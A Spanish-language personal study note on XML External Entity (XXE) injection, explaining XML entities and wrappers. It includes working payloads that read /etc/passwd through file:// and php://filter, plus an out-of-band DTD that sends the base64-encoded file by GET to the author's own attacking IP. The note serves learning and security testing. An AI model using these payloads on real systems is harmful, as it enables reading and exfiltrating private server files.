-----------------
- Tags: #explotación #owasp_top10 #web #bash 
----------------
# Definición

> XXE: XML External Entity Injection. Es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

## Estructura

Esta es la estructura de un formato xml que se envía en una petición del servidor web:

![[Pasted image 20230624223738.png|900]]

![[Pasted image 20230624223854.png|900]]

Cuando se habla de estructuras en XML, se deben hablar de las entidades:

- **Entidades:** Son una forma de representar un elemento de datos, sin referenciar a los datos como tal, todo ello en un documento XML. Existen varios tipos de entidades:
	-> Genéricas / Customizadas
	-> Externas (XXE).
	-> Predefinidas: Como por ejemplo *&lt;*, *&gt*;

Ejemplo de entidades: 

![[Pasted image 20230624224656.png|900]]

Para crear una entidad se debe mantener la siguiente estructura:

```XML
<!DOCTYPE foo [<!ENTITY myName "sebax">]>
```

Donde:

* *myName:* Corresponde al nombre de la entidad.
* *sebax:* Corresponde al valor de la entidad.

Dado lo anterior, podríamos leer los archivos del sistema como por ejemplo usando la siguiente expresión:

```XML
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
```

* File es un _**Wraper**_

La idea es crear entidades que permitan listar contenidos privilegiados y hacer más cositas.

### Wrapers

- file -> Permite representar archivos mostrándolos completos.
- php://filter/convert.base64-encode/resource=/etc/passwd -> Permite representar el archivo en una sola cadena en base 64.

Cuando no deja declarar la entidad en la estructura del XML, o cuando no veo el output del comando que estoy inyectando, se puede declarar y llamar en la misma definición del DOCTYPE, de la siguiente manera:

```XML
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.20.23/testXXE"> %myFile;]>
```

También, cuando el output no se representa en la respuesta del serviidor, se pueden crear archivos externos desde la máquina atacante para que ejecute el comando y lo envíe en la petición al servidor, como por ejemplo:

```XML
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.20.23/?file=%file;'>">
%eval;
%exfil;
```

La primera entidad *file*, se encarga de hacer la lectura del archivo que queremos (para el ejemplo el archivo /erc/passwd) y el segundo *exfil*, se encarga de hacer el envío de la lectura de la primera entidad por GET al servidor indicado (para el ejemplo la máquina de atacante, es decir mi IP).

